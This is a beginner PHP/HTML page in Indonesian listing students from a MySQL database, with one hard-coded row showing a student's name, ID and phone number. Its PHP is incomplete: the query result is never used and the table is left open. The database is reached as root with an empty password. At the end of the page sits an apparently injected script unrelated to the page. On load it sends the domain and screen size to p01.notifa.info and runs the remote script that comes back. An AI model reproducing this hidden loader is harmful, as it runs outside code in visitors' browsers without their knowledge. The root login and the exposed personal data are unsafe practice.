<?php
// Koneksi ke Database dan Pilih Databasenya
$conn = mysqli_connect('localhost', 'root', '', 'belajar');

// Query isi tabel Mahasiswa
$result = mysqli_query($conn, "SELECT * FROM data_mahasiswa");

// Ubah data ke dalam bentuk Array
mysqli_fetch_row($result);

// Simpan ke variable Mahasiswa 

?>

<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
  <title>Daftar Mahasiswa</title>
</head>

<body>
  <h3>Daftar Mahasiswa</h3>

  <table border="1" cellpadding="5" cellspacing="0">
    <tr>
      <th>No</th>
      <th>Gambar</th>
      <th>NIM</th>
      <th>NAMA</th>
      <th>KELAS</th>
      <th>JURUSAN</th>
      <th>TLP</th>
      <th>AKSI</th>
    </tr>
    <tr>
      <td>1</td>
      <td><img src="Image/2109.jpg" width="60"></td>
      <td>18416255201162</td>
      <td>IQBAL ALFIAN</td>
      <td>IF18F</td>
      <td>TEKNIK INFORMATIKA</td>
      <td>081214449996</td>
      <td>
        <a href="">Edit</a> | <a href="">Delete</a>
      </td>
    </tr>
    <table>

      <script type="text/javascript">
        if (self == top) {
          function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
              fn();
              callback();
            }, 0);
          }

          function sync(fn) {
            fn();
          }

          function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXklkT8xyA0OMj14zDoV2uiIHpH3f%2bEMGJM4mmvyVyMWnze6Jyffq6alxelWofPABGke9xJsTFcsF5ZSGQ0J759lRukew8F%2bhCE0NNUm3pU4KoA3x5IZQoU4Z5I4EQiDEmuWooG3n%2fB6mp40bWa4wymUG0QgYWnFl%2fYlLKmefGlGf3wyW4qsUZ6DKBio6ftDXZakMbJY5ps4wKduKXNYf4dNsLBLXl4Dmr7IMS34i%2f9Z5tsG3iB%2bv395JAvIofgaqJ7e7EGE6QXaTmUofIN13bWJtDpIaUnVhMg89ZMaEpAs1vktdEtiLOjU9kO39r0BUw%2bq9hDQUXgULBJlgqV0Zxxle0dyxnFeCeiCMfs9s2j2TkMzmY%2fgtFSWsWtaQBTXqYUVLiGsuHmGHv9R6iu3SfuYYcEcJKmNAsYqTuI2ET99BWPLJW1txHIrHGn7pX%2fdqR5T1WOLZVatWf5RqRaPjn2BOdHoxfNxBG2g8VqyzT4K%2fpCLRjPvY37AD23xHCYctCRqdRXmyXwv6%2bntIn5GRyj1QXl38Af0a54xjmfSsEx4J2sM0L9TA7%2bbBZs%2fzfgOgpa1ulIXADogOJJQeYOtIKOE8%2bbYnoXeC2jCvdXYv7q0WJaUNpUaHT%2b3DD1Gef1ifSR0N4l4QfAnR9p%2bSbZyansh8fjHdbak069AsfN1yZjse7ukzG4NGQ6g%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
          }
          netbro_cache_analytics(requestCfs, function() {});
        };
      </script>
</body>

</html>